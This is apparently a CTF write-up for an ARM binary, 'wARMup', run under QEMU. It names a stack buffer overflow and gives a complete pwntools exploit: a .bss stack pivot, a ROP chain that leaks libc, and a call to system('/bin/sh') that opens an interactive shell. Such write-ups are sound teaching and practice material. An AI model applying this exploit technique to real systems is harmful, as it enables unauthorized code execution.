## 1. Protection

```bash
[checksec]
Arch:     arm-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x10000)
```
NX bit doesn't set because it's run on QEMU.

---

## 2.Vulnerability

Stack Buffer-Overflow

---

## 3.Exploit-Flow

1. write ROP gadget at bss using read gadget in main function
2. leave-ret to bss
3. ROP

---

## 4. Exploit-Code

```python
from pwn import *
import sys

if sys.argv[1]=='0':
    p=process(['qemu-arm','-L','./','./wARMup'])
elif sys.argv[1]=='1':
    print 'debug...'
    p=process(['qemu-arm','-g','1234','-L','./','./wARMup'])

#p=remote('18.191.89.190',1337)

read_plt=0x1037c
read_got=0x2100c
puts_got=0x21014
puts_plt=0x10394
main=0x104f8

pop_r3_pc=0x00010364
mov_r0_r3_call_r3=0x0001059c
p45678sbslpc=0x000105ac
p4x6012xpd=0x000105ac
buf=0x21500

payload='A'*0x64
payload+=p32(buf+0x68)
payload+=p32(0x1052c)
payload+="B"*(0x78-len(payload))

p.send(payload)

pause()
payload2=p32(pop_r3_pc)+p32(puts_plt)
payload2+=p32(p45678sbslpc)+"A"*12+p32(read_got)+"A"*12
payload2+=p32(mov_r0_r3_call_r3)
payload2+=p32(0)+p32(read_got)+p32(1)+p32(0)+p32(buf+len(payload2)+32)+p32(0x80)+"A"*4+p32(0x1058c)
payload2+='A'*(0x64-len(payload2))
payload2+=p32(buf)+p32(0x10548)
p.send(payload2)

p.recvuntil('CTF!\n')
read=u32(p.recvn(4))
libc=read-0xc1150
system=libc+0x37154
binsh=libc+0x11d588
success('libc = {}'.format(hex(libc)))
success('system = {}'.format(hex(system)))

payload3=p32(0)+p32(buf+0x6c)+p32(1)+p32(binsh)+"A"*12+p32(0x1058c)+p32(system)
p.send(payload3)

p.interactive()
```

ROP using libc_csu_init gadget : )

---

## 5. Review

- NX bit is never set when binary is running on QEMU.  With this fact, it could be easily solved using arm shell-code.
